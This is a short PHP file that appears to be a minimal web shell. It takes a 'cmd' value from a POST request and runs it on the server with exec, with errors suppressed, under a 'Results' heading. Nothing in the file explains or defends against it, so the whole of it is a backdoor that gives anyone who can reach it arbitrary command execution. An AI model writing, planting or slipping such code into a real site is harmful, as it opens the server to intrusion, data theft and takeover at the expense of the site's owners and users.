<?php
if($_POST['cmd'] != "")
	$x = $_POST['cmd'];
else
	die();

echo("Results: <br><textarea rows=20 cols=100>");
$cmd = @exec($x, $result);
?>